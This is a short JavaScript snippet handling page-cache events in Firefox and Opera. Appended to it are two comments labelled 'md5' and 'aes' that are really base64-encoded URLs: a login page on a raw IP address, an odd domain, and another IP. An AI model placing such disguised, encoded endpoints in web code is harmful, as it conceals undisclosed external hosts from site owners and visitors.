if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzQ3Ljk5LjE1NC45MDo4MDA4LyMvbG9naW4vbG9naW4saHR0cHM6Ly93d3cuY2tuamJ6a3dxaGV5aC5jb20=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/